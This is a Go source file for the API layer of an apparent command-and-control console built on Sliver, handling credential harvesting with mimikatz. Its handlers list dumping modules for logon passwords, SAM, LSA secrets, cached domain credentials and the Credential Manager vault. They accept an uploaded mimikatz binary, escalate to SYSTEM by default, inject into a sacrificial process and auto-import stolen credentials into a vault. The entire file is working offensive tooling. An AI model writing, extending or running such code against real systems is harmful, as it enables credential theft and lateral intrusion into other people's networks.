package api

import (
	"encoding/base64"
	"net/http"
	"strconv"
	"strings"

	"c2tool/internal/ui/sliver"
)

// --- Credential harvesting (mimikatz) ---

// sessionMetaFor resolves a session's identity and its operating system. The
// vault records an OriginHostUUID per credential, and the persistence catalog is
// platform-specific, so both callers need this. A missing session is not fatal
// — the operator can still parse captured output or name a module — so this
// reports empty strings rather than failing the request.
func (s *Server) sessionMetaFor(c *sliver.Client, id string) (uuid, os string) {
	if c == nil {
		return "", ""
	}
	sessions, err := c.Sessions()
	if err != nil {
		return "", ""
	}
	for _, sess := range sessions {
		if sess.ID == id {
			return sess.UUID, strings.ToLower(sess.OS)
		}
	}
	return "", ""
}

// handleMimikatzModules reports what the console can run, plus the defaults, so
// the UI never has to hardcode a command name that the backend might change.
func (s *Server) handleMimikatzModules(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]any{
		"commands": defaultMimikatzCommands(),
		"command":  sliver.DefaultMimikatzCommand,
		"modes":    sliver.MimikatzModes(),
	})
}

// defaultMimikatzCommands is the curated set offered in the UI.
//
// These are the modules that map onto the fields the parser understands. The
// rest of mimikatz (crypto, token, process) produces output that is useful to
// read but yields no vault entries, so they are left to the free-text box.
func defaultMimikatzCommands() []map[string]string {
	return []map[string]string{
		{"command": "sekurlsa::logonpasswords", "label": "Logon passwords (plaintext, NTLM, SHA1)"},
		{"command": "sekurlsa::wdigest", "label": "WDigest credentials"},
		{"command": "sekurlsa::msv", "label": "MSV hashes only"},
		{"command": "lsadump::sam", "label": "Local SAM hive (requires admin)"},
		{"command": "lsadump::lsa /patch", "label": "LSA secrets via in-memory patch (admin)"},
		{"command": "lsadump::cache", "label": "Cached domain credentials (admin)"},
		{"command": "vault::cred /patch", "label": "Credential Manager vault (admin)"},
	}
}

// handleMimikatzRun uploads (optionally), runs, parses, and imports.
func (s *Server) handleMimikatzRun(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}

	var req struct {
		Command string `json:"command"`
		Binary  string `json:"binary"` // base64 of a mimikatz build
		AutoAdd *bool  `json:"autoAdd"`
		// Elevate escalates to SYSTEM before the run when the token is not
		// already elevated. Absent means on: the modules that need it are the
		// ones an operator reaches for, and an access-denied they have to
		// interpret is a worse default than one extra step that reports itself.
		Elevate        *bool  `json:"elevate"`
		HostingProcess string `json:"hostingProcess"`
		// Mode selects how the payload reaches the target. Empty means auto,
		// which is what a client that predates this field sends.
		Mode string `json:"mode"`
		// Process is the sacrificial process an in-memory run is injected into.
		// Empty uses the console's default.
		Process string `json:"process"`
	}
	if !decodeBody(w, r, &req) {
		return
	}

	run := sliver.MimikatzRequest{
		Command: req.Command,
		// Default to importing. The request that motivated this feature was
		// "extract and automatically add to the credential vault", so a client
		// that omits the flag gets that behaviour. An explicit false still
		// parses without writing.
		AutoAdd: req.AutoAdd == nil || *req.AutoAdd,
		Elevate: req.Elevate,

		HostingProcess: req.HostingProcess,
		Mode:           req.Mode,
		Process:        req.Process,
	}

	if req.Binary != "" {
		blob, err := base64.StdEncoding.DecodeString(req.Binary)
		if err != nil {
			writeErr(w, http.StatusBadRequest, "binary is not valid base64")
			return
		}
		run.Upload = blob
	}

	uuid, _ := s.sessionMetaFor(c, id)
	// The path parameter may name a session or a beacon; which one it is is
	// resolved by lookup rather than by guessing from the string.
	target, err := c.ResolveTarget(id)
	if err != nil {
		writeErr(w, http.StatusNotFound, err.Error())
		return
	}
	result, err := c.MimikatzRun(target, run, uuid)
	writeResult(w, result, err)
}

// handleMimikatzParse runs the parser against text the operator pastes in.
//
// Output captured on an engagement, or from a host the console has no session
// on, is still worth mining. This path never touches a target and never writes
// to the vault unless the caller asks: it is the reviewable half of the feature.
func (s *Server) handleMimikatzParse(c *sliver.Client, w http.ResponseWriter, r *http.Request) {
	var req struct {
		Text    string `json:"text"`
		Source  string `json:"source"`
		AutoAdd bool   `json:"autoAdd"`
		Session string `json:"session"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if req.Text == "" {
		writeErr(w, http.StatusBadRequest, "text is required")
		return
	}

	parsed := sliver.ParseMimikatz(req.Text, req.Source)
	resp := map[string]any{
		"ok":     true,
		"parsed": parsed,
		"count":  len(parsed),
		"added":  0,
	}

	if req.AutoAdd && len(parsed) > 0 {
		uuid := ""
		if req.Session != "" {
			if u, _ := s.sessionMetaFor(c, req.Session); u != "" {
				uuid = u
			}
		}
		added, err := c.MimikatzImport(parsed, uuid)
		if err != nil {
			// The parse succeeded, so return the credentials and report the
			// import failure alongside them instead of losing the output.
			resp["ok"] = false
			resp["message"] = "parsed " + strconv.Itoa(len(parsed)) + " credential(s) but could not add them: " + err.Error()
			writeJSON(w, http.StatusOK, resp)
			return
		}
		resp["added"] = added
	}
	writeJSON(w, http.StatusOK, resp)
}
